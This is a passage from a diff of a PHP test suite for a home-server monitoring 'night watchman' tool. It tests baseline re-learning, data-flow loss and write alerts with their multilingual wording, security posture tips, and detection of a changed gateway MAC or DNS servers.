+        same("relearn apply: «{$cat}» pending cleared", [[$cat => 1], false], [$was, isset($sst['relearn_pending'])]);
+    }
+
+    // «Re-learn everything», then a round
+    $resAll = watchmanRelearn(watchmanRelearnCats(), false, false, $data, $t0 + 4000, false);
+    same('relearn all: every open entry noted, one line per area, the folder named «all»', [[], count(WATCH_CATS), true],
+        [$openKinds(), count(array_filter(watchmanLoad($data)['book'], fn ($e) => $e['kind'] === 'watch' && ($e['p']['at'] ?? null) === null && isset($e['p']['relearn']) && $e['time'] === $t0 + 4000)),
+         str_ends_with($resAll['aside'], '-all')]);
+    $r = $round($t0 + 4300);
+    same('relearn all: the round after it — nothing added, the container normal now', [[], true], [$r['added'], isset(watchmanLoad($data)['baseline']['containers']['db'])]);
+    hardeningRm($tmp);
+
+    // during the learning phase: the data flow's two areas each their own learning time — then an update (an older office's
+    // state without the keys, a newer one's with keys it doesn't know) leaves it as it is
+    $f = ['since' => 1000, 'clients' => ['1.2.3.4|smb' => ['first' => 1000]], 'shares' => ['media' => ['first' => 1000]]];
+    $tmp = hardeningTmp('watch-relearn-flow');
+    $data = "$tmp/data";
+    @mkdir($data, 0700, true);
+    writeAtomic("$data/baseline.json", jsonEncode(['hired' => 1000, 'time' => 1000, 'ips' => [], 'fail_ips' => [], 'flow' => ['since' => 1000, 'smb_users' => [],
+        'smb_clients' => [], 'ack' => ['flow_client:1.2.3.4|smb' => ['bytes' => 5], 'flow_written:media' => ['bytes' => 7]]]]), 0600);
+    writeAtomic("$data/state.json", jsonEncode(['future' => ['x' => 1]]), 0600);
+    writeAtomic("$data/flow.json", jsonEncode($f), 0600);
+    writeAtomic("$data/book.json", jsonEncode(['entries' => []]), 0600);
+    $now = 1000 + 2 * 86400;          // two days in: still learning
+    $rp = watchmanRelearn(['pull'], false, false, $data, $now, false);
+    $fl = readJson("$data/flow.json");
+    $bl = watchmanLoad($data)['baseline'];
+    same('learning phase: pull re-learned — its series and «I know» marks gone, data\'s kept, the common start kept', [[], ['media'], ['flow_written:media'], 1000],
+        [$fl['clients'], array_keys($fl['shares']), array_keys($bl['flow']['ack']), $fl['since']]);
+    $cats = watchmanCats(['hired' => true, 'on_watch' => 1000, 'time' => $now + 6 * 86400, 'round' => [], 'book' => [], 'flow' => ['days' => 8, 'learn' => 7],
+        'relearn' => watchmanRelearnPage(watchmanLoad($data)['state'], $now + 6 * 86400)]);
+    same('learning phase: 6 days after — pull still re-learning (its own time), data learned (the common one)', [true, false],
+        [in_array('relearn_flow', $cats['areas']['pull']['why'], true), in_array('relearn_flow', $cats['areas']['data']['why'], true) || in_array('learning', $cats['areas']['data']['why'], true)]);
+    same('learning phase: the state keys it doesn\'t know kept (an update either way)', ['x' => 1], watchmanLoad($data)['state']['future'] ?? null);
+    $st = watchmanLoad($data)['state'];
+    unset($st['relearn_pending']);
+    writeAtomic("$data/state.json", jsonEncode(array_diff_key($st, ['relearn' => 1])), 0600);       // as an older office's round leaves it
+    same('update: an older office\'s state (no relearn keys) — no tile says it, «Bring back» still reads its folder', [[], 1],
+        [watchmanRelearnPage(watchmanLoad($data)['state'], $now + 100), count((array) (readJson("$data/aside/{$rp['aside']}/relearn.json")['flow'] ?? []))]);
+    // the router and the network share net: cut by sub-part — the router's admins, VPN users, failures; the network's devices
+    $bl = watchmanLoad($data)['baseline'];
+    $bl['net'] = ['senders' => ['192.168.1.1' => ['first' => 1]], 'admins' => ['admin' => 1], 'vpn' => ['v' => 1], 'fail_ips' => ['1.1.1.1' => 1],
+                  'devices' => ['aa:bb' => ['first' => 1]], 'blocked' => ['x' => 1]];
+    writeAtomic("$data/baseline.json", jsonEncode($bl), 0600);
+    writeAtomic("$data/net.json", jsonEncode(['pos' => ['192.168.1.1' => ['ino' => 1, 'size' => 99]], 'other' => 1]), 0600);
+    writeAtomic("$data/hw.json", jsonEncode(['v' => 1, 'boot' => 'b', 'wear' => ['sda' => ['used' => 3]]]), 0600);
+    $rr = watchmanRelearn(['router', 'hw'], false, false, $data, $now + 200, false);
+    $bl = watchmanLoad($data)['baseline'];
+    $net = readJson("$data/net.json");
+    same('router: its parts cleared, the network\'s and the senders kept; the router files read anew (learning), other keys of net.json kept',
+        [[], [], [], ['aa:bb'], ['x' => 1], ['192.168.1.1'], [], 1],
+        [$bl['net']['admins'], $bl['net']['vpn'], $bl['net']['fail_ips'], array_keys($bl['net']['devices']), $bl['net']['blocked'], array_keys($bl['net']['senders']),
+         $net['pos'], $net['other'] ?? null]);
+    same('hardware: its history copied aside, the round takes its look as at a take-over', [true, true, true],
+        [is_file("$data/aside/{$rr['aside']}/hw.json"), is_file("$data/hw.json"), isset(watchmanLoad($data)['state']['relearn_pending']['hw'])]);
+    hardeningRm($tmp);
+}
+
+/**
  * The night watchman: his login lines, bursts of failures, the syslog by
  * offset and rotation, rights and plugin sources, and a whole watch on copies
  * — taking over (nothing reported), a night with changes (one entry each,
@@ -20902,7 +25992,7 @@ function testWatchman(): void
          array_keys($d['baseline']['shares'])]);
     same('watch: one line in the book that he took over', ['watch'], array_column($d['book'], 'kind'));
     check('watch: never a password field in his files', !str_contains((string) file_get_contents("$data/baseline.json") . file_get_contents("$data/seen.json"), '$6$'));
-    same('watch: the team lead hears "quiet"', [['quiet', true]], array_map(fn ($f) => [$f['id'], $f['ok']], watchmanChecks($data)));
+    same('watch: the team lead hears nothing of his book (1.96: no «quiet» either)', [], array_map(fn ($f) => [$f['id'], $f['ok']], watchmanChecks($data)));
 
     // the night: what differs
     $t = $now + 300;
@@ -20949,11 +26039,11 @@ function testWatchman(): void
         str_contains(implode("\n", $c), OFFICE_NOTIFY_EVENT . ': ' . officeNotifyText('watchman', 'notify.login_failures', ['n' => 1] + watchmanText($by['login_failures']), $lang)));
     $f = array_column(watchmanChecks($data), null, 'id');
     $kinds = array_column(watchmanFindings(watchmanLoad($data)['book']), null, 'id');
-    // 2026-11-22 (the owner: not twice — his own list has them): ONE line for them all at the team lead
-    same('watch: the team lead gets ONE line for every open entry (recommended, to his page) — his list has one per kind, with the newest',
-        [['open', 'posture'], 'recommended', false, array_sum(array_column(array_column($kinds, 'params'), 'n')), '#/watchman', 13, 1, '10.9.8.7'],
-        [array_keys($f), $f['open']['level'] ?? null, $f['open']['ok'] ?? null, $f['open']['params']['n'] ?? null, $f['open']['link'] ?? null,
-         count($kinds), $kinds['login_new_ip']['params']['n'] ?? null, $kinds['login_new_ip']['params']['ip'] ?? null]);
+    // 1.96 (Benj, 2026-11-23: never twice — his page, the reception card and Unraid's notifications have them): nothing of his
+    // book at the team lead; his list keeps one line per kind, with the newest
+    same('watch: the team lead gets no line for open entries — only the security tips; his list has one per kind, with the newest',
+        [['posture'], 13, 1, '10.9.8.7'],
+        [array_keys($f), count($kinds), $kinds['login_new_ip']['params']['n'] ?? null, $kinds['login_new_ip']['params']['ip'] ?? null]);
     same('watch: and, good to know, how many security tips (Media open to everyone; privileged plex is only good to know)', ['hint', 1],
         [$f['posture']['level'] ?? null, $f['posture']['params']['n'] ?? null]);
 
@@ -21175,9 +26265,11 @@ function testWatchmanTeamLeadOne(): void
     same('watch team lead: an old per-kind note — its entries noted as before, the others untouched', [null, null, 'teamlead', null, 'page'], array_column($after, 'by'));
     // the router log gone silent: a line of its own at the team lead (he needs it to watch)
     $src = (string) file_get_contents(OFFICE_DIR . '/agent/desks/watchman.php');
-    check('watch team lead: what he needs to watch stays a line of its own (the router log); the checks fold the rest into the one line',
+    // 1.96 (Benj, 2026-11-23): nothing else of his book at the team lead — no one line, no «quiet», no areas switched off
+    check('watch team lead: what he needs to watch stays a line of its own (the router log); nothing else of his book, no areas off',
         str_contains($src, "const WATCH_TEAMLEAD_OWN = ['net_log_silent'];") && preg_match('/function watchmanChecks\(.*?\n\}/s', $src, $m)
-        && str_contains($m[0], "in_array(\$f['id'], WATCH_TEAMLEAD_OWN, true)") && str_contains($m[0], 'watchmanOpenFinding($d[\'book\'])'));
+        && str_contains($m[0], "in_array(\$f['id'], WATCH_TEAMLEAD_OWN, true)") && !str_contains($m[0], 'watchmanOpenFinding(')
+        && !str_contains($m[0], "'quiet'") && !str_contains($m[0], "'areas_off'"));
     hardeningRm($tmp);
 }
 
@@ -22361,7 +27453,7 @@ function testWatchmanAtTold(): void
         [$r4['added'], array_column($r4['told'], 'kind'), count($lines(substr($job2, 1))), count($lines(substr($job, 1)))]);
     $src2 = (string) file_get_contents(OFFICE_DIR . '/agent/desks/watchman.php');
     check('at told (S6): the kind is told like cron_file_foreign; a job stuck days past its time is marked important, not told anew',
-        str_contains($src2, "'at_job'               => ['sched', true],") && str_contains($src2, '$late = !$run && $now - (int) $j[\'when\'] >= WATCH_AT_LATE;')
+        str_contains($src2, "'at_job'               => ['sched', true],") && str_contains($src2, '$late = !$run && $now - (int) $j[\'when\'] >= $atLate;') && str_contains($src2, 'bool $changed = false, int $atLate = WATCH_AT_LATE): ?string')
         && str_contains((string) file_get_contents(OFFICE_DIR . '/docs/GUIDE.md'), 'goes to the notifications once, when it appears'));
     putenv($envBefore === false ? 'OFFICE_NOTIFY_BIN' : "OFFICE_NOTIFY_BIN=$envBefore");
     @unlink(watchmanLockFile($day, 'book'));
@@ -22830,7 +27922,8 @@ function testWatchmanOwnCron(): void
         $round($t);
         fanboyGuardCron(true);
         $r = $round($t += 60);
-        same('own cron: back after a month (the file forgotten meanwhile) — the same line refreshed, no second one', [[], [], 1, 2],
+        // 1.96 step 7: a line he noted himself, quiet a week, went into his history — back, it is one new line (still one in the book)
+        same('own cron: back after a month (the file forgotten meanwhile) — one line in the book again, no second one (the old one in his history)', [[], [], 1, 1],
             [$r['added'], $opened(), count($o = $ours()), $o[0]['count'] ?? null]);
         $kept = array_values(array_filter(watchmanLoad($data)['book'], fn ($e) => $e['id'] === $old['id']));
         same('own cron: the entry an older version wrote stays as it was (open, its words) — the book is history', [$old], $kept);
@@ -22964,10 +28057,10 @@ function testWatchmanFlowGone(): void
         [$added, (function (array $a) { sort($a); return $a; })(array_keys($by)), [$se['bytes'] ?? null, $se['pct'] ?? null, $se['kept'] ?? null, $se['asleep'] ?? null, $se['from'] ?? null, $se['clients'] ?? null],
          $by['flow_gone:share:Filme']['p']['bytes'] ?? null, $by['flow_gone:disk:disk1']['p']['bytes'] ?? null,
          [array_sum($flow['gone']['disk:disk3']['h'] ?? []), array_sum($flow['gone']['disk:disk3']['o'] ?? [])]]);
-    same('gone in words', "300 GB gone from Serien in 5 min — 27 % of the share while I'm still learning what is normal. 200 GB of it still in its snapshots. "
+    same('gone in words', "300 GB gone from Serien in 5 min — 27 % of the share while he is still learning what is usual. 200 GB of it still in its snapshots. "
         . "Moving data over SMB, NFS or SSH then: 192.0.2.7 (SSH). Not looked at (asleep): cold.",
         officeNotifyText('watchman', 'entry.flow_gone', watchmanText($by['flow_gone:share:Serien'], 'en'), 'en'));
-    same('gone in words: a disk', "200 GB gone from disk1 (Filme, Serien) in 5 min — more than 100 GB in one round while I'm still learning what is normal. "
+    same('gone in words: a disk', "200 GB gone from disk1 (Filme, Serien) in 5 min — more than 100 GB in one check while he is still learning what is usual. "
         . "Moving data over SMB, NFS or SSH then: 192.0.2.7 (SSH). Measured for the whole disk (btrfs), not per share.",
         officeNotifyText('watchman', 'entry.flow_gone', watchmanText($by['flow_gone:disk:disk1'], 'en'), 'en'));
 
@@ -22981,8 +28074,10 @@ function testWatchmanFlowGone(): void
     $now['tank/Musik'] = $ds(200 * $gb);
     [$added4, $flow, $cnt] = watchmanFlowCompare($bf, $flow, $cnt, $look(['conns' => [$conn('192.0.2.7', 2000)], 'zfs' => $zfs($now)]), $book, $t0 + 1500);
     $mu = array_column(array_filter($book, 'watchmanOpen'), null, 'key')['flow_gone:share:Musik']['p'] ?? [];
-    same('gone: the mover moving (and the round after), the office at work — expected; then 200 GB with nobody connected: the server itself',
-        [[], [], [], ['flow_gone'], 400 * $gb, 'server', []],
+    // 1.96 step 6g: the office at work excuses only its own shares — 200 GB gone from Musik while a backup runs is told (up to
+    // 1.95 it was expected anywhere), the round after updates that line
+    same('gone: the mover moving (and the round after) — expected; then, a backup running, 200 GB gone from Musik with nobody connected: the server itself, told',
+        [[], [], ['flow_gone'], [], 200 * $gb, 'server', []],
         [$added, $added2, $added3, $added4, array_sum($flow['gone']['share:Musik']['o'] ?? []), $mu['from'] ?? null, $flow['can']['moving'] ?? null]);
 
     // a whole share (with a child dataset) put into the storeroom, later the storeroom emptied: never a loss
@@ -23000,7 +28095,7 @@ function testWatchmanFlowGone(): void
 
     $f = watchmanFlowSummary($bf, $flow, $t0 + 1600);
     $rows = array_column($f['gone'], null, 'key');
-    same('gone on the page: per share and disk, the last 24 h, what was expected, no counters', [300 * $gb, 400 * $gb, 200 * $gb, 'disk1', 100, 10],
+    same('gone on the page: per share and disk, the last 24 h, what was expected, no counters', [300 * $gb, 200 * $gb, 400 * $gb, 'disk1', 100, 10],
         [$rows['share:Serien']['day'] ?? null, $rows['share:Musik']['expected'] ?? null, $rows['share:Musik']['day'] ?? null, $rows['disk:disk1']['disk'] ?? null,
          (int) round($f['limits']['gone_new'] / $gb), $f['limits']['gone_part']]);
     $b2 = ['flow' => $bf];
@@ -23303,10 +28398,10 @@ function testWatchmanFlowFiles(): void
         [[], ['flow_gone', 'flow_written'], ['flow_gone:files:disk:disk1', 'flow_written:disk:disk3'], [25000, true, 'server', 'disk1'], [60 * $gb, 'disk3', 'btrfs', ['Familienfilme']]],
         [$a0, (function (array $a) { sort($a); return $a; })($a1), (function (array $a) { sort($a); return $a; })(array_keys($open)),
          [$d1['files'] ?? null, $d1['renames'] ?? null, $d1['from'] ?? null, $d1['disk'] ?? null], [$d3['bytes'] ?? null, $d3['disk'] ?? null, $d3['fs'] ?? null, $d3['shares'] ?? null]]);
-    same('files deleted in words', "25000 files gone from disk1 (Fotos, Dokumente) in 5 min — more than 20000 files in one round while I'm still learning what is normal. "
+    same('files deleted in words', "25000 files gone from disk1 (Fotos, Dokumente) in 5 min — more than 20000 files in one check while he is still learning what is usual. "
         . "No client moved data over SMB, NFS or SSH then — it came from the server itself. On XFS a renamed file counts too. Measured for the whole disk (xfs), not per share.",
         officeNotifyText('watchman', 'entry.flow_gone', watchmanText($open['flow_gone:files:disk:disk1'], 'en'), 'en'));
-    same('a disk written in words', "60 GB written into disk3 (Familienfilme) in 5 min — more than 50 GB in one round while I'm still learning what is normal. Measured for the whole disk (btrfs), not per share.",
+    same('a disk written in words', "60 GB written into disk3 (Familienfilme) in 5 min — more than 50 GB in one check while he is still learning what is usual. Measured for the whole disk (btrfs), not per share.",
         officeNotifyText('watchman', 'entry.flow_written', watchmanText($open['flow_written:disk:disk3'], 'en'), 'en'));
     same('the notification and the team lead\'s line', ['Night watchman: 25000 files gone from disk1 (Fotos, Dokumente)', 'Nachtwächter: 60 GB geschrieben in disk3 (Familienfilme)'],
         [officeNotifyText('watchman', 'notify.flow_gone', ['n' => 1] + watchmanText($open['flow_gone:files:disk:disk1'], 'en'), 'en'),
@@ -23361,7 +28456,7 @@ function testWatchmanFlowFiles(): void
         [['flow_gone', 'flow_gone'], ['flow_gone:files:share:Fotos', 'flow_gone:share:Musik'], 21000, [200 * $gb, 30000]],
         [$z1, (function (array $a) { sort($a); return $a; })(array_keys($open)), $open['flow_gone:files:share:Fotos']['p']['files'] ?? null,
          [$open['flow_gone:share:Musik']['p']['bytes'] ?? null, $open['flow_gone:share:Musik']['p']['files'] ?? null]]);
-    same('ZFS: both in words (de)', ['21000 Dateien weg aus Fotos in 5 Min. — mehr als 20000 Dateien in einem Rundgang, während ich noch lerne, was normal ist. '
+    same('ZFS: both in words (de)', ['21000 Dateien weg aus Fotos in 5 Min. — mehr als 20000 Dateien in einer Prüfung, während er noch lernt, was üblich ist. '
         . 'Kein Client bewegte damals über SMB, NFS oder SSH Daten — es kam vom Server selbst.', '30000 Dateien wurden gelöscht.'],
         [officeNotifyText('watchman', 'entry.flow_gone', watchmanText($open['flow_gone:files:share:Fotos'], 'de'), 'de'),
          officeNotifyText('watchman', 'gone.files', ['n' => 30000], 'de')]);
@@ -23417,7 +28512,7 @@ function testWatchmanFlowFiles(): void
     [, $flow, $cnt] = watchmanFlowCompare($bf, $flow, $cnt, $look(['disks' => $disks($used), 'fs' => $bfs(62 * $gb, 160), 'where' => $where]), $book, $t0 + 1200);
     $we = array_column(array_filter($book, 'watchmanOpen'), null, 'key')['flow_written:disk:disk3'] ?? ['p' => []];
     same('btrfs where: never asked for a quiet round, for the entry from the generation its run began at — also when brought up to date',
-        [[], ['flow_written'], [['disk3', 100], ['disk3', 100]], "62 GB written into disk3 (Familienfilme) in 15 min — more than 50 GB in one round while I'm still learning what is normal. "
+        [[], ['flow_written'], [['disk3', 100], ['disk3', 100]], "62 GB written into disk3 (Familienfilme) in 15 min — more than 50 GB in one check while he is still learning what is usual. "
             . "Most of it into: Familienfotos (55 GB). Measured for the whole disk (btrfs), not per share."],
         [$quiet, $w1, $calls, officeNotifyText('watchman', 'entry.flow_written', watchmanText($we, 'en'), 'en')]);
 
@@ -23544,7 +28639,7 @@ function testWatchmanFlow(): void
         [[$h => 100 * $gb], [], [$h => 40 * $gb], [], [$h => 30 * $gb], [$h => 80 * $gb]],
         [$flow['containers']['kopia']['o'], $flow['containers']['kopia']['h'], $flow['shares']['tank/UnraidSecretaryOffice']['o'],
          $flow['shares']['tank/UnraidSecretaryOffice']['h'], $flow['shares']['tank/data']['h'], $flow['containers']['EmbyServer']['h']]);
-    same('flow entry: a share in words', '30 GB written into tank/data in 5 min — 30 % of the share while I\'m still learning what is normal. Most of it: tank/data itself, not a dataset below it, 30 GB.',
+    same('flow entry: a share in words', '30 GB written into tank/data in 5 min — 30 % of the share while he is still learning what is usual. Most of it: tank/data itself, not a dataset below it, 30 GB.',
         officeNotifyText('watchman', 'entry.flow_written', watchmanText($by['flow_written'], 'en'), 'en'));
     same('flow: per client and service, the server talking to itself left out', [['192.0.2.7|smb', '192.0.2.9|smb', '192.0.2.7|web'], 61 * $gb, 2 * 1024 ** 2],
         [array_keys($flow['clients']), $flow['totals']['sent']['smb'], $flow['totals']['sent']['web']]);
@@ -23560,7 +28655,7 @@ function testWatchmanFlow(): void
         [$added, $by['flow_written']['p']['bytes'], $by['flow_written']['p']['pct'], $by['flow_written']['p']['minutes'], $by['flow_client']['p']['bytes'],
          $by['flow_client']['p']['minutes'], $by['flow_client']['count']]);
     same('flow: Kopia outside the backup is learned like any other', [$h => 5 * $gb], $flow['containers']['kopia']['h']);
-    same('flow entry: in words (English)', '192.0.2.9 pulled 70 GB over SMB in 10 min — more than 50 GB in one round while I\'m still learning what is normal',
+    same('flow entry: in words (English)', '192.0.2.9 pulled 70 GB over SMB in 10 min — more than 50 GB in one check while he is still learning what is usual',
         officeNotifyText('watchman', 'entry.flow_client', watchmanText($by['flow_client'], 'en'), 'en'));
 
     // snapshots: one taken (written drops: what came since), one deleted (it grew: can't be told — left out)
@@ -24113,10 +29208,10 @@ function testWatchmanFlowSources(): void
     same('flow sources: Docker asked once, only for the entry', 1, $asks);
     same('flow sources: a share of one dataset — no single source', [['t' => 'none', 'b' => 30 * $gb]], $by['flow_written:maple/appdata']['p']['src']);
     same('flow sources: the entry in words, the biggest source named',
-        '8.4 GB written into maple/system in 5 min — 42 % of the share while I\'m still learning what is normal. Most of it: Container EmbyServer (its writable layer), 3.5 GB.',
+        '8.4 GB written into maple/system in 5 min — 42 % of the share while he is still learning what is usual. Most of it: Container EmbyServer (its writable layer), 3.5 GB.',
         officeNotifyText('watchman', 'entry.flow_written', watchmanText($e, 'en'), 'en'));
     same('flow sources: no single source, in words (German)',
-        '30 GB geschrieben in maple/appdata in 5 Min. — 30 % des Shares, während ich noch lerne, was normal ist. Keine einzelne Quelle sichtbar — maple/appdata ist ein einziges Dataset.',
+        '30 GB geschrieben in maple/appdata in 5 Min. — 30 % des Shares, während er noch lernt, was üblich ist. Keine einzelne Quelle sichtbar — maple/appdata ist ein einziges Dataset.',
         officeNotifyText('watchman', 'entry.flow_written', watchmanText($by['flow_written:maple/appdata'], 'de'), 'de'));
 
     // five minutes on: the container writes on, the unknown layer is deleted meanwhile
@@ -24267,8 +29362,8 @@ function testWatchmanFlowGuess(): void
     check('flow guess: the entry\'s line carries it (the notification\'s too)', str_ends_with(officeNotifyText('watchman', 'entry.flow_written', watchmanText($e, 'fr'), 'fr'),
         "Aucune source distincte visible. Probablement : EmbyServer, Win11 (une supposition)."),
         officeNotifyText('watchman', 'entry.flow_written', watchmanText($e, 'fr'), 'fr'));
-    same('flow guess: the round\'s look keeps the containers\' binds (and ports) out of seen.json, like their pids', true,
-        str_contains((string) file_get_contents(OFFICE_DIR . '/agent/desks/watchman.php'), "'compose' => true, 'binds' => true, 'ports' => true]"));
+    same('flow guess: the round\'s look keeps the containers\' binds (and ports, and the known vulnerabilities\' mounts) out of seen.json, like their pids', true,
+        str_contains((string) file_get_contents(OFFICE_DIR . '/agent/desks/watchman.php'), "'compose' => true, 'binds' => true, 'ports' => true, 'vuln_mounts' => true]"));
     exec('rm -rf ' . escapeshellarg($tmp));
 }
 
@@ -24423,7 +29518,7 @@ function testHostShell(): void
     same('host shell: the sites on the host and their shapes (HARDENING.md «Commands»)', [
         'advisor.php' => ['constant'], 'agent.php' => ['wrapper'], 'backup.php' => ['value $script'],
         'logs-flood.php' => ['wrapper'], 'logs.php' => ['wrapper'], 'report.php' => ['literal'], 'restore-dataset.php' => ['literal'],
-        'watchman-diskwakes.php' => ['wrapper'], 'watchman.php' => ['wrapper', 'wrapper']], $sites);
+        'watchman-diskwakes.php' => ['wrapper'], 'watchman-vuln.php' => ['wrapper'], 'watchman.php' => ['wrapper', 'wrapper']], $sites);
 
     // the one script built from values: every value through escapeshellarg (the wait is an int, the command's words are each escaped)
     $backup = (string) file_get_contents(OFFICE_DIR . '/agent/desks/backup.php');
@@ -27789,7 +32884,10 @@ function testDockerOffSaid(): void
     check('docker off: the Consultant — a container «unknown», never «missing» or «not here»; his offers refuse (ad_docker_off)',
         str_contains($src('agent/desks/advisor.php'), "+ (\$known === null ? ['unknown' => true] : [])")
         && str_contains($src('public/desks/advisor/desk.js'), "const missing = () => externals().filter(([, x]) => !x.there && !x.optional && !unknown(x));"));
-    check('docker off: the Night Watchman — never «8 containers» as if counted now', str_contains($src('public/desks/watchman/desk.js'), "value: dockerOff() ? Office.t('common.docker_off')"));
+    // (1.96 «einfacher»: the tile «Im Auge» that counted them is gone; the count stands in the Container area's «Known: n
+    // containers» — with Docker off it says so, with the count as last seen)
+    check('docker off: the Night Watchman — never «8 containers» as if counted now', str_contains($src('public/desks/watchman/desk.js'),
+        "dockerOff() ? T('watch.containers_last', { docker: Office.t('common.docker_off'), sum: cSum }) : cSum"));
     check('docker off: «Where is what» — never «0 containers», never «No VMs» with the VM service off',
         str_contains($src('public/desks/cleanup/desk.js'), "dk && dk.up === false ? Office.t('common.docker_off')")
         && substr_count($src('public/desks/cleanup/desk.js'), "vms.up === false ? T('tile.vm_off')") === 3);
@@ -29240,7 +34338,7 @@ function testWatchmanPosture(): void
     same('posture: on the page — nobody knows them yet, six of his advice open', [6, [false]], [$page['posture']['open'], array_values(array_unique(array_column($page['posture']['tips'], 'known')))]);
     check('posture: no signatures on the page', !str_contains(json_encode($page['posture']), 'sig'));
     $hint = array_column(watchmanChecks($data), null, 'id');
-    same('posture: the team lead hears it as good to know, next to "quiet"', [true, 'hint', null, 6, '#/watchman'],
+    same('posture: the team lead hears it as good to know (1.96: nothing of his book beside it, no «quiet»)', [false, 'hint', null, 6, '#/watchman'],
         [isset($hint['quiet']), $hint['posture']['level'] ?? null, array_key_exists('ok', $hint['posture'] ?? []) ? $hint['posture']['ok'] : 'x',
          $hint['posture']['params']['n'] ?? null, $hint['posture']['link'] ?? null]);
     same('posture: never in the watch book', ['watch'], array_column(watchmanLoad($data)['book'], 'kind'));
@@ -29264,16 +34362,16 @@ function testWatchmanPosture(): void
     same('posture: the VM service off — no VM can run, no VMScape', false, isset($tips(510)['vmscape']));
     file_put_contents($paths['libvirt_sock'], '');
 
-    // what it is about changes: back; gone: forgotten, and back as new when it returns
+    // what it is about changes: back; gone a while: your answer kept (1.96, concept 3.4 case 4) — back unchanged, still known
     file_put_contents($paths['sec'], $sec("[\"Photos\"]\nexport=\"e\"\nsecurity=\"public\"\n"));
     file_put_contents($paths['ident'], "USE_TELNET=\"no\"\n");
     $round(600);
-    same('posture: another share opened — the tip is back; Telnet off — gone and forgotten',
-        [false, 3, false, ['public']], [$tips(610)['public']['known'], $tips(610)['public']['p']['n'], isset($tips(610)['telnet']),
+    same('posture: another share opened — the tip is back; Telnet off — gone, your answer kept',
+        [false, 3, false, ['telnet', 'public']], [$tips(610)['public']['known'], $tips(610)['public']['p']['n'], isset($tips(610)['telnet']),
                                          array_keys((readJson("$data/posture.json") ?? [])['acks'] ?? [])]);
     file_put_contents($paths['ident'], "USE_TELNET=\"yes\"\n");
     $round(900);
-    same('posture: Telnet on again — told again', false, $tips(910)['telnet']['known'] ?? null);
+    same('posture: Telnet on again, as it was — still known, not asked again (1.96)', true, $tips(910)['telnet']['known'] ?? null);
     watchmanPostureAck('telnet', true, $data, $now + 920, false);
     watchmanPostureAck('telnet', false, $data, $now + 930, false);
     same('posture: «Show again»', false, $tips(940)['telnet']['known']);
@@ -29477,6 +34575,292 @@ function testWatchmanPrivilegedStopped(): void
  * released not by Ms. Snapshotini is snap_hold_released; a pool asleep is never "gone"; «I know, thanks»
  * teaches a series
  */
+/**
+ * The server's own router and DNS (agent/lib/watchnet.php, concept 11 G): the default route's gateway and its MAC from
+ * the server's ARP table, the DNS servers from resolv.conf — no router log needed, the night shift too. The same
+ * address with another MAC two rounds in a row: net_gateway (told); a wobble or a missing ARP entry: nothing; another
+ * gateway address: learned; other DNS servers: net_dns (not told); «I know, thanks» learns them; the mirror carries it.
+ */
+function testWatchmanGateway(): void
+{
+    $src = hardeningTmp('watch-gw');
+    $now = 1790000000;
+    $paths = ['route' => "$src/route", 'arp' => "$src/arp", 'resolv' => "$src/resolv.conf"];
+    $route = function (string $gwHex, string $more = '') use ($src) {
+        file_put_contents("$src/route", "Iface\tDestination\tGateway \tFlags\tRefCnt\tUse\tMetric\tMask\t\tMTU\tWindow\tIRTT\n"
+            . "wg0\t00000000\t0102A8C0\t0003\t0\t0\t100\t00000000\t0\t0\t0\n"
+            . "br0\t00000000\t$gwHex\t0003\t0\t0\t0\t00000000\t0\t0\t0\n"
+            . "br0\t0001A8C0\t00000000\t0001\t0\t0\t0\t00FFFFFF\t0\t0\t0\n" . $more);
+    };
+    $arp = function (string $mac, string $flags = '0x2', string $ip = '192.168.1.1') use ($src) {
+        file_put_contents("$src/arp", "IP address       HW type     Flags       HW address            Mask     Device\n"
+            . "192.168.1.50     0x1         0x0         00:00:00:00:00:00     *        br0\n"
+            . "$ip      0x1         $flags         $mac     *        br0\n");
+    };
+    $route('0101A8C0');
+    $arp('AA:BB:CC:00:00:01');
+    file_put_contents("$src/resolv.conf", "# Generated by dhcpcd\nnameserver 192.168.1.1\nnameserver 1.1.1.1\nnameserver bogus\n");
+    $look = watchnetGateway($paths);
+    same('gateway: the default route with the lowest metric, its MAC (complete entry, lower case), the DNS servers (sorted, valid only)',
+        ['gw' => ['ip' => '192.168.1.1', 'iface' => 'br0', 'mac' => 'aa:bb:cc:00:00:01'], 'dns' => ['1.1.1.1', '192.168.1.1']], $look);
+    same('gateway: no route path — not looked at', null, watchnetGateway(['arp' => "$src/arp"]));
+    $known = null;
+    $book = [];
+    $round = function (int $t) use (&$known, &$book, $paths): array {
+        return watchnetGatewayCompare($known, watchnetGateway($paths), $book, $t);
+    };
+    same('gateway: the first look is normal', [[], [], ['192.168.1.1' => ['aa:bb:cc:00:00:01' => $now]], ['1.1.1.1', '192.168.1.1']],
+        [$round($now), $book, $known['gw'], $known['dns']]);
+    // a wobble: another MAC once, then the known one again — nothing
+    $arp('aa:bb:cc:00:00:99');
+    $round($now + 300);
+    $arp('aa:bb:cc:00:00:01');
+    same('gateway: another MAC for one round, then the known one — nothing, the wait gone', [[], [], null], [$round($now + 600), $book, $known['wait']]);
+    // the ARP entry missing (it ages out when idle) or incomplete: he says nothing
+    $arp('00:00:00:00:00:00', '0x0');
+    same('gateway: no complete ARP entry — nothing said, nothing learned', [[], [], null], [$round($now + 900), $book, $known['wait']]);
+    // another MAC two rounds in a row: told
+    $arp('de:ad:be:ef:00:01');
+    same('gateway: another MAC — not yet in the first round', [[], ['ip' => '192.168.1.1', 'mac' => 'de:ad:be:ef:00:01', 'n' => 1]], [$round($now + 1200), $known['wait']]);
+    $added = $round($now + 1500);
+    $e = $book[0] ?? [];
+    same('gateway: … the second round in a row — net_gateway with the address, the new MAC and the known ones',
+        [['net_gateway'], 'net_gateway:192.168.1.1:de:ad:be:ef:00:01', ['ip' => '192.168.1.1', 'mac' => 'de:ad:be:ef:00:01', 'iface' => 'br0', 'old' => ['aa:bb:cc:00:00:01']]],
+        [$added, $e['key'] ?? null, $e['p'] ?? null]);
+    same('gateway: … its words', ['ip' => '192.168.1.1', 'mac' => 'de:ad:be:ef:00:01', 'old' => 'aa:bb:cc:00:00:01'], watchmanText($e));
+    same('gateway: … the next round: the same entry, not learned by itself', [[], 1, false], [$round($now + 1800), count($book), isset($known['gw']['192.168.1.1']['de:ad:be:ef:00:01'])]);
+    // «I know, thanks»: this MAC is the router's too (two routers in turn)
+    $b = ['lan' => $known];
+    watchnetGatewayAdopt($b, $e, ['lan' => watchnetGateway($paths)], $now + 1900);
+    $known = $b['lan'];
+    $book[0]['noted'] = $now + 1900;
+    same('gateway: «I know, thanks» — that MAC known too, nothing new', [[], 1, true],
